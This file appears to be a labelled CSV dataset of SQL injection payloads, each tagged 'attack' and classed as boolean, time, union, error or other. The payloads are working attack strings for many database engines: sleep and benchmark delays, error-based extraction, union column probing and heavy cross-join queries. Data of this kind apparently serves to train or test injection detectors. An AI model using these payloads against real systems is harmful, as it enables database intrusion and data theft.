label,payload,family
attack,"1"" and 3580  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",boolean
attack,1'  )   as gdie where 8133  =  8133 rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )   --,other
attack,1'||  (  select 'puco' where 2605  =  2605 union all select null#,union
attack,-1011 or 7140  =  9977--,boolean
attack,"1'  )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and   (  'hfxu' like 'hfxu",boolean
attack,"-8436'  )   as frmf where 7225  =  7225 or make_set  (  9354  =  9354,7185  )  --",boolean
attack,"1""  )   as uyns where 4751  =  4751 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  --",time
attack,"1""   )    )    as knyf where 8109  =  8109 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1'  )   as uytv where 7875  =  7875 or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,"1   )    )    as vycb where 3524  =  3524 and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"-3731'   )    )     )   or elt  (  7540  =  1412,1412  )   and    (    (     (  'iwch'  =  'iwch",boolean
attack,1'   )    )    as zffq where 9572  =  9572 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,time
attack,"-1157   )    )    as sxie where 7118  =  7118 or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",error
attack,"-4797' union all select 8223,8223,8223,8223,8223,8223,8223,8223#",union
attack,"1""   )    )     )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and    (    (     (  ""uncg""  =  ""uncg",time
attack,1'||  (  select 'lnhq' where 7526  =  7526,other
attack,-8513  )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  5818  =  5818,error
attack,"1""  )   where 8095  =  8095 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",error
attack,"1' and elt  (  4249  =  4249,7259  )   and 'awjd'  =  'awjd",boolean
attack,"1""  )   and 6414  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and   (  ""udlh""  =  ""udlh",boolean
attack,"1"" where 6281  =  6281 or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",boolean
attack,"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  '%'  =  '",boolean
attack,"1%"" or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""krxy""  =  ""krxy",boolean
attack,"1""  )   where 5719  =  5719 rlike sleep  (  5  )  --",time
attack,"1' and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and 'egye'  =  'egye",boolean
attack,"1""   )    )    as jikg where 8258  =  8258 and   (  3973  =  1047  )  *1047--",boolean
attack,"1  )   where 5464  =  5464 or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,-4954'  )   or 8571  =  8571--,boolean
attack,"iif  (  1483  =  7301,1,1/0  )  ",other
attack,"1'||  (  select 'jonh' from dual where 2415  =  2415 union all select null,null,null,null,null,null,null,null,null--",union
attack,-4239 or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  -- xacp,boolean
attack,-4173'  )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and   (  'jdwt' like 'jdwt,error
attack,"1   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  1205  =  1205",error
attack,"1'  )   or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",boolean
attack,1'||  (  select 'dyuw' from dual where 2037  =  2037,other
attack,"1""  )   where 6072  =  6072 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",time
attack,"-8790'  )   or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'nsze' like 'nsze",boolean
attack,"-9023%""   )    )     )   union all select 4490,4490,4490#",union
attack,"1'  )   as bxae where 4143  =  4143 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )  --",error
attack,"1'   )    )    as eleh where 1347  =  1347 or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack, (  select   (  case when   (  1421  =  1421  )   then 1 else 1421*  (  select 1421 from master..sysdatabases  )   end   )    ) ,other
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""%""  =  """,boolean
attack,"1   )    )    as midl where 9046  =  9046 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",boolean
attack,"1%' union all select null,null,null,null,null,null,null,null#",union
attack,"1%'  )   and 9660  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",boolean
attack,-3867%'  )   or 3084  =  5633 and   (  '%'  =  ',boolean
attack,select   (  case when   (  6287  =  8341  )   then 6287 else 1/  (  select 0  )   end  )  --,other
attack,"1""   )    )     )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and    (    (     (  ""text"" like ""text",boolean
attack,"1'  )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",time
attack,"-9928""   )    )    union all select 7511,7511,7511,7511,7511,7511,7511,7511#",union
attack,"1  )   where 9213  =  9213 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",boolean
attack,-4032'  )   where 5157  =  5157 or 1809  =  2810#,boolean
attack,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  -- xsob",boolean
attack,"1' in boolean mode  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  #",error
attack,"-4923"" or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and ""afjc"" like ""afjc",error
attack,"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and ""rugr""  =  ""rugr",boolean
attack,"-2909'||  (  select 'qfeq' where 7062  =  7062 union all select 7062,7062,7062,7062,7062,7062--",union
attack,"1""   )    )    as nbdc where 4444  =  4444 union all select null,null--",union
attack,"select * from generate_series  (  2673,2673,case when   (  2673  =  1468  )   then 1 else 0 end  )   limit 1--",other
attack,"-7656""   )    )     )   union all select 3172,3172,3172,3172,3172,3172,3172,3172,3172,3172--",union
attack,"1"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and ""ssfu""  =  ""ssfu",time
attack,"1""   )    )    and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   ""ksrh""  =  ""ksrh",boolean
attack,"-5513""   )    )     )   or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   and    (    (     (  ""ovmk"" like ""ovmk",error
attack,"  (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and ""plqe""  =  ""plqe",time
attack,"1%'   )    )     )   union all select null,null,null,null,null,null,null,null--",union
attack,"1'   )    )     )   or 5356  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",boolean
attack,1 where 7055  =  7055,other
attack,"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""%""  =  """,boolean
attack,"1'||  (  select 'iwlj' where 8704  =  8704 and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",error
attack,"1'  )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and   (  'vkde'  =  'vkde",error
attack,"1"" where 1115  =  1115 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1' or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  ",boolean
attack,1'||  (  select 'lxyu' from dual where 5789  =  5789 union all select null#,union
attack,"1%""   )    )     )   union all select null,null,null,null,null,null,null,null,null#",union
attack,"1'||  (  select 'drna' from dual where 5082  =  5082 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  ||'",time
attack,"1""  )   as kslq where 8669  =  8669 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",boolean
attack,1  )   and 7533  =  7533 and   (  7175  =  7175,boolean
attack,1'  )   where 3730  =  3730 and sleep  (  5  )  #,time
attack,"1'||  (  select 'bmyt' from dual where 9407  =  9407 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",boolean
attack,"-8599   )    )    or elt  (  5628  =  2324,2324  )   and    (    (   1134  =  1134",boolean
attack,"1 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  ",boolean
attack,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and    (    (   'rkoe'  =  'rkoe",boolean
attack,"1'  )   as jxqt where 4322  =  4322 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,"1"" where 6325  =  6325 union all select null,null,null,null,null,null,null,null,null,null#",union
attack,"1%"" and 2006  =  2006",boolean
attack,"-8654' union all select 7190,7190,7190,7190,7190#",union
attack,-7444   )    )     )   or 1342  =  9774,boolean
attack,"1'   )    )    union all select null,null,null#",union
attack,"1'   )    )    and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   'kqqf'  =  'kqqf",error
attack,"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",error
attack,"1  )   where 9829  =  9829 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",boolean
attack,1   )    )    as wwkw where 7289  =  7289 and 7533  =  7533--,boolean
attack,"1' or 8514  =  benchmark  (  5000000,md5  (  0x544d5a4c   )    )   #",time
attack,"1"" where 4450  =  4450 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",boolean
attack,"1%"" rlike   (  select   (  case when   (  5135  =  9839  )   then 1 else 0x28 end   )    )    and ""%""  =  """,boolean
attack,"-3975'  )   or make_set  (  1943  =  3499,3499  )   and   (  'dawb'  =  'dawb",boolean
attack,1' where 2661  =  2661,other
attack,"-4686""  )   as dxks where 7123  =  7123 or elt  (  1032  =  1032,3623  )  --",boolean
attack,"1   )    )     )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (     (  5199  =  5199",error
attack,1  )   as mpnj where 5049  =  5049,other
attack,"-9031%""  )   order by 1--",other
attack,"iif  (  1305  =  5656,1,1/0  )  ",other
attack,"1   )    )     )   union all select null,null,null,null#",union
attack,1'||  (  select 'bhxx' where 2585  =  2585,other
attack,"1' union all select null,null,null,null,null,null,null,null,null#",union
attack,"1"" where 9919  =  9919",other
attack,"1'  )   where 4750  =  4750 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",error
attack,1'  )   as kqbh where 6138  =  6138,other
attack,"1"" where 4064  =  4064 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --",boolean
attack,"1"" where 4319  =  4319",other
attack,"1'   )    )    or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and    (    (   'uwrm'  =  'uwrm",boolean
attack,"1'   )    )    and 8514  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )   and    (    (   'ican' like 'ican",boolean
attack,select   (  case when   (  6859  =  6507  )   then 6859 else 6859*  (  select 6859 from mysql.db  )   end  )  #,other
attack,1' in boolean mode  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )  #,time
attack,1'||  (  select 'mnvk' from dual where 4181  =  4181,other
attack,"1'   )    )     )   and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (     (  'wsmq'  =  'wsmq",boolean
